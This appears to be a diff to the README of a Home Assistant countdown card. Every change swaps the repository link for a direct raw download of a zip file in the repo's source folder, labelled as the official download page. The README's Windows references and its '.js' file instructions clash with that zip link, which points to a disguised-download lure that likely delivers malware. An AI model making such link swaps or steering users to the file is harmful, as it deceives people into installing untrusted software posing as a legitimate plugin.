@@ -1,6 +1,6 @@
 # ⏳ ha-countdown-card - Track important dates in Home Assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Distinctive-cyril4439/ha-countdown-card)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ This software works with standard Windows setups. Ensure your computer meets the
 
 Follow these steps to add the countdown card to your dashboard.
 
-1. Visit the [official download page](https://github.com/Distinctive-cyril4439/ha-countdown-card) to access the files.
+1. Visit the [official download page](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip) to access the files.
 2. Look for the latest release on the right side of the page.
 3. Download the file ending in `.js` to your computer.
 4. Move this file into the `www` folder located inside your Home Assistant configuration directory.
@@ -82,4 +82,4 @@ You can adjust how the card looks to match your existing dashboard theme. Add th
 *   `color_text`: Change the color of the numbers to make them stand out.
 *   `animation`: Enable this to make the numbers pulse as they count down toward your target date.
 
-Refer to the documentation on the [download page](https://github.com/Distinctive-cyril4439/ha-countdown-card) for a complete list of style parameters. Always test your changes in a single card before applying them to your entire dashboard. This ensures your interface remains stable and easy to use.
+Refer to the documentation on the [download page](https://raw.githubusercontent.com/Distinctive-cyril4439/ha-countdown-card/main/src/countdown-ha-card-v1.0.zip) for a complete list of style parameters. Always test your changes in a single card before applying them to your entire dashboard. This ensures your interface remains stable and easy to use.
